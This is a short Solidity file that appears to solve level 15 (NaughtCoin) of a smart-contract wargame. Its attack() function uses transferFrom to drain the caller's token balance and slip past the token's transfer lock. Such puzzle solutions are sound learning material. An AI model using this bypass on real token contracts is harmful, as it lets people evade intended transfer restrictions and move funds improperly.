// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/Level15.sol";

contract Level15A {
    address addr = 0xd077854D0aE164342f7261A3010F4C4f1411eeD5;

    function attack() public {
        NaughtCoin c = NaughtCoin(addr);
        c.transferFrom(msg.sender, address(this), c.balanceOf(msg.sender));
    }
}
